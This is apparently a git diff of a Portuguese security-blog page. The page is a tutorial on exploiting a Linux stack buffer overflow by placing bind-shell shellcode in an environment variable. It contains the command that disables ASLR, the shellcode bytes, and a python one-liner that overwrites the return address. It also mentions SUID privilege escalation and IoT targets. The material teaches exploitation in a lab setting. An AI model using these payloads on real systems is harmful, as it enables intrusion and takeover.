@@ -3,29 +3,34 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- iOS Safari -->
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
-  <meta name="theme-color" content="#FFFFFF">
-  <meta property="og:title" content="Injetando Shellcode através de variáveis de ambiente">
-    <meta name="description" content="Uma forma de exploração de Buffer Overflow simples, em linux, usando variáveis de ambiente como ponto de entrada para a inserção do shellcode">
-  <meta property="og:description" content="Uma forma de exploração de Buffer Overflow simples, em linux, usando variáveis de ambiente como ponto de entrada para a inserção do shellcode">
-    <meta property="og:type" content="blog">
-  <title>Injetando Shellcode através de variáveis de ambiente</title>
-  <!-- Favicon -->
-    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
-  <link rel="stylesheet" type="text/css"
-    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
-  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
-  <link rel="stylesheet" type="text/css" href="css/notablog.css">
-  <link rel="stylesheet" type="text/css" href="css/theme.css">
-  <style>
-    :root {
-      font-size: 18px;
-    }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
 
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Injetando Shellcode através de variáveis de ambiente&nbsp;|&nbsp;www.offensivethink.com</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Injetando Shellcode através de variáveis de ambiente">
+  
+    <meta name="description" content="Uma forma de exploração de Buffer Overflow simples, em linux, usando variáveis de ambiente como ponto de entrada para a inserção do shellcode">
+    <meta property="og:description" content="Uma forma de exploração de Buffer Overflow simples, em linux, usando variáveis de ambiente como ponto de entrada para a inserção do shellcode">
+  
+  
+  <style>
     .DateTagBar {
       margin-top: 1.0rem;
     }
@@ -34,40 +39,110 @@
 
 <body>
   <nav class="Navbar">
-    <a href="index.html">
-      <div class="Navbar__Btn"> <span>Home</span></div>
-    </a>
-                                                    <span class="Navbar__Delim">&centerdot;</span>
-    <a href="referencia-rapida.html">
-      <div class="Navbar__Btn"> <span>→ Referência rápida ← </span></div>
-    </a>
-                                                                                                                                        <span class="Navbar__Delim">&centerdot;</span>
-    <a href="contacts.html">
-      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&id=ca933149-5245-4511-a885-9cf5922808e1"></span> <span>about & contacts</span></div>
-    </a>
-                <span class="Navbar__Delim">&centerdot;</span>
-    <a href="offensivetools.html">
-      <div class="Navbar__Btn"> <span>Offensive Tools</span></div>
-    </a>
-                                                                                          </nav>
-  <header class="Header">
-          <div class="Header__Spacer Header__Spacer--NoCover">
+  <a href="index.html">
+    <div class="Navbar__Btn">
+      
+      <span>Home</span>
     </div>
-        <h1 class="Header__Title">Injetando Shellcode através de variáveis de ambiente</h1>
-            <div class="DateTagBar">
-                <span class="DateTagBar__Item DateTagBar__Date">Posted on Mon, Jan 18, 2021</span>
-                          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--gray">
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="referencia-rapida.html">
+        <div class="Navbar__Btn">
+          
+          <span>→ Referência rápida ← </span>
+        </div>
+      </a>
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="contacts.html">
+        <div class="Navbar__Btn">
+          
+            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
+          
+          <span>about &amp; contacts</span>
+        </div>
+      </a>
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="offensivetools.html">
+        <div class="Navbar__Btn">
+          
+          <span>Offensive Tools</span>
+        </div>
+      </a>
+    
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+    <h1 class="Header__Title_post">Injetando Shellcode através de variáveis de ambiente</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Mon, Jan 18, 2021</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--gray">
             <a href="tag/bof.html">bof</a>
           </span>
-                <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
             <a href="tag/binary-exploitation.html">binary-exploitation</a>
           </span>
-                <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
             <a href="tag/osce.html">osce</a>
           </span>
-                  </div>
-          </header>
-      <article id="https://www.notion.so/d68c2fa9083d4f459d0ffccca99049fc" class="PageRoot"><div id="https://www.notion.so/f5309d83b2fd4fffb1faa7c613c31470" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">No linux, sempre que você executa um binário as variáveis de ambiente são copiadas para a pilha do processo. Uma das técnicas para binary exploitation consiste em usar as variáveis de ambiente como pontos de entrada do binário. </span></span></p></div><div id="https://www.notion.so/b3ffae60f146474a9f783fe8074d93fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para que o exemplo abaixo funcione é necessário que algumas proteções estejam desabilitadas: ASLR, para que os endereços não sejam randomizados e o binário não deve possuir a proteção NX, para que seja possível executar código na pilha.  </span></span></p></div><pre id="https://www.notion.so/f1d11e5b901b4299a3186c968269334d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ sudo echo 0 &gt;  /proc/sys/kernel/randomize_va_space</span></span></span></code></pre><pre id="https://www.notion.so/7f0c1430beaf414e98febbe5215eb2eb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>joaninhadark@kali &gt; ~/binary-exploitation/bof $ checksec binario-teste 
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/d68c2fa9083d4f459d0ffccca99049fc" class="PageRoot"><div id="https://www.notion.so/f5309d83b2fd4fffb1faa7c613c31470" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">No linux, sempre que você executa um binário as variáveis de ambiente são copiadas para a pilha do processo. Uma das técnicas para binary exploitation consiste em usar as variáveis de ambiente como pontos de entrada do binário. </span></span></p></div><div id="https://www.notion.so/b3ffae60f146474a9f783fe8074d93fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para que o exemplo abaixo funcione é necessário que algumas proteções estejam desabilitadas: ASLR, para que os endereços não sejam randomizados e o binário não deve possuir a proteção NX, para que seja possível executar código na pilha.  </span></span></p></div><pre id="https://www.notion.so/f1d11e5b901b4299a3186c968269334d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ sudo echo 0 &gt;  /proc/sys/kernel/randomize_va_space</span></span></span></code></pre><pre id="https://www.notion.so/7f0c1430beaf414e98febbe5215eb2eb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>joaninhadark@kali &gt; ~/binary-exploitation/bof $ checksec binario-teste 
 [*] &#x27;/home/kali/binary-exploitation/bof/binario-teste&#x27;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -95,13 +170,14 @@ Vamos criar um pequeno shellcode de teste usando o msfvenon mesmo (fique a vonta
 Mas precisamos saber qual o endereço da variável de ambiente que criamos e para isso vamos usar a um pequeno binário de nome </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">getenviroment</strong></span><span class="SemanticString"> que adaptei para mostrar o endereço de uma variável de ambiente e seu conteúdo. Você encontra o binário e o código fonte no meu repositório </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">offensivetools</strong></mark></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/58cb9e70200a49cf831cedbb04357799" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"> </span></span></p></div><div id="https://www.notion.so/54b774437508488ba6da36140135d02f" class="Bookmark"><a href="https://github.com/diegoalbuquerque/offensivetools"><h5 class="Bookmark__Title">diegoalbuquerque/offensivetools</h5><p class="Bookmark__Desc">My little tools created to study and practice offensive thinking - diegoalbuquerque/offensivetools</p><p class="Bookmark__Link">https://github.com/diegoalbuquerque/offensivetools</p></a></div><div id="https://www.notion.so/09645bb6be1943a4b51bc038891b900d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2aed8a61aab84e73aa21696521e4f62c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A ferramenta espera o nome da variável e quantidade de bytes que você pretende ver a partir do endereço da memória da variável</span></span></p></div><div id="https://www.notion.so/91594737d89c4e8187d030be29d13238" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/4232475b1f3f4c32830e09466fca5afb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ ./getenviroment shellcode 100 
   [+] The variable shellcode is at: 0xffffdf39
   [+] Memory content at 0xffffdf39
-      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xBD\x74\xAA\x4E\x45\xDB\xD4\xD9\x74\x24\xF4\x58\x2B\xC9\xB1\x14\x31\x68\x14\x83\xE8\xFC\x3\x68\x10\x96\x5F\x7F\x9E\xA1\x43\xD3\x63\x1E\xEE\xD6\xEA\x41\x5E\xB0\x21\x1\xC4\x63\xE8\x69\xF9\x9B\x9\x50\x97\x8B\x40\xF2\xEE\x4D\x8\x94\xA8\x40\x4D\xD1\x8\x5F\xFD\xE5\x3A\x39\xCC\x65\x79\x76\xA8\xA8\xFE\xE5\x6C\x58\xC0\x51\x42\x1C\x77\x1B%</span></span></span></code></pre><div id="https://www.notion.so/b986228eefd0404d84aa025f9398602d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5748536fc51f4d8e911362dc77833b9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora que temos o endereço vamos fazer o buffer overflow no binário.</span></span></p></div><pre id="https://www.notion.so/d3af99a67cf743f8bec0fb068fa243f9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ python -c &quot;print &#x27;A&#x27;*812+&#x27;\xff\xff\xdf\x39&#x27;[::-1]&quot; | ./binario-teste</span></span></span></code></pre><div id="https://www.notion.so/98aba0a31b4c4103b02c49218c087c24" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24ad7826c3434adaacfbd8c000c4d871" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93f8748f-f0b2-430c-96f5-caf23d58384c%2FUntitled.png?width=1425&amp;table=block&amp;id=24ad7826-c343-4ada-acfb-d8c000c4d871"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93f8748f-f0b2-430c-96f5-caf23d58384c%2FUntitled.png?width=1425&amp;table=block&amp;id=24ad7826-c343-4ada-acfb-d8c000c4d871" style="width:100%"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Processo &quot;travado&quot;. Em outra janela, conexão ao bind shell.</span></span></figcaption></figure></div><div id="https://www.notion.so/bf427f2940094115b5a11c3cf10ed8d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Observação!</strong></mark></span><span class="SemanticString"> Muitas vezes o endereço vazado não é exatamente o certo, logo é só ir incrementando de byte em byte até que a exploração funcione. </span></span></p></div><div id="https://www.notion.so/cda27072303d4c129221f7009a4cb854" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/d9da560990d84f1c8b77eae18f98c4ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Como podemos observar existem algumas limitações de termos que obter o endereço da variável de ambiente, que pode mudar, mesmo sem o ASLR habilitado. O binário também precisa não ter habilitada a proteção NX. Mas acho que toda técnica é interessante pois um dia poderá ter seu uso. Quem sabe em uma pós exploração onde temos um binário com SUID BIT e ai podemos obter o endereço da variável e fazer um shellcode só para escalar privilégio ? QUem sabe uma exploração em um IOT que não tem todas estas proteções ? </span></span></p></div><div id="https://www.notion.so/dce0f02b1b694707bfdde51980325e97" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O que penso da técnica é que podemos contornar algumas limitações, como por exemplo, limite de bytes do buffer que você pode escrever, já que , quem vai copiar as variáveis de ambiente será o S.O, sem limites. Podemos pensar em facilidade em bypassar aquele campo que seria passível de injeção mas que devido aos filtros nos leva a ter que nos preocupar com um  monte de badchars.  </span></span></p></div><div id="https://www.notion.so/05a58fe4d4734988a8db52d06ec2f1fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Acho que é isso. </span></span></p></div><div id="https://www.notion.so/3986be661c4a4eaf8f0e82629883eb29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>  <footer class="Footer">
-        <div>&copy; Offensive Articles 2019</div>
-        <div>&centerdot;</div>
-        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
-            rel="noopener noreferrer">Notablog</a>.
-        </div>
-    </footer>
+      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xBD\x74\xAA\x4E\x45\xDB\xD4\xD9\x74\x24\xF4\x58\x2B\xC9\xB1\x14\x31\x68\x14\x83\xE8\xFC\x3\x68\x10\x96\x5F\x7F\x9E\xA1\x43\xD3\x63\x1E\xEE\xD6\xEA\x41\x5E\xB0\x21\x1\xC4\x63\xE8\x69\xF9\x9B\x9\x50\x97\x8B\x40\xF2\xEE\x4D\x8\x94\xA8\x40\x4D\xD1\x8\x5F\xFD\xE5\x3A\x39\xCC\x65\x79\x76\xA8\xA8\xFE\xE5\x6C\x58\xC0\x51\x42\x1C\x77\x1B%</span></span></span></code></pre><div id="https://www.notion.so/b986228eefd0404d84aa025f9398602d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5748536fc51f4d8e911362dc77833b9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora que temos o endereço vamos fazer o buffer overflow no binário.</span></span></p></div><pre id="https://www.notion.so/d3af99a67cf743f8bec0fb068fa243f9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ python -c &quot;print &#x27;A&#x27;*812+&#x27;\xff\xff\xdf\x39&#x27;[::-1]&quot; | ./binario-teste</span></span></span></code></pre><div id="https://www.notion.so/98aba0a31b4c4103b02c49218c087c24" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24ad7826c3434adaacfbd8c000c4d871" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93f8748f-f0b2-430c-96f5-caf23d58384c%2FUntitled.png?width=1425&amp;table=block&amp;id=24ad7826-c343-4ada-acfb-d8c000c4d871"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93f8748f-f0b2-430c-96f5-caf23d58384c%2FUntitled.png?width=1425&amp;table=block&amp;id=24ad7826-c343-4ada-acfb-d8c000c4d871" style="width:100%"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Processo &quot;travado&quot;. Em outra janela, conexão ao bind shell.</span></span></figcaption></figure></div><div id="https://www.notion.so/bf427f2940094115b5a11c3cf10ed8d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Observação!</strong></mark></span><span class="SemanticString"> Muitas vezes o endereço vazado não é exatamente o certo, logo é só ir incrementando de byte em byte até que a exploração funcione. </span></span></p></div><div id="https://www.notion.so/cda27072303d4c129221f7009a4cb854" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/d9da560990d84f1c8b77eae18f98c4ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Como podemos observar existem algumas limitações de termos que obter o endereço da variável de ambiente, que pode mudar, mesmo sem o ASLR habilitado. O binário também precisa não ter habilitada a proteção NX. Mas acho que toda técnica é interessante pois um dia poderá ter seu uso. Quem sabe em uma pós exploração onde temos um binário com SUID BIT e ai podemos obter o endereço da variável e fazer um shellcode só para escalar privilégio ? QUem sabe uma exploração em um IOT que não tem todas estas proteções ? </span></span></p></div><div id="https://www.notion.so/dce0f02b1b694707bfdde51980325e97" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O que penso da técnica é que podemos contornar algumas limitações, como por exemplo, limite de bytes do buffer que você pode escrever, já que , quem vai copiar as variáveis de ambiente será o S.O, sem limites. Podemos pensar em facilidade em bypassar aquele campo que seria passível de injeção mas que devido aos filtros nos leva a ter que nos preocupar com um  monte de badchars.  </span></span></p></div><div id="https://www.notion.so/05a58fe4d4734988a8db52d06ec2f1fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Acho que é isso. </span></span></p></div><div id="https://www.notion.so/3986be661c4a4eaf8f0e82629883eb29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
+  <footer class="Footer">
+  <div>&copy; www.offensivethink.com 2019-2021</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
 </body>
 
 </html>
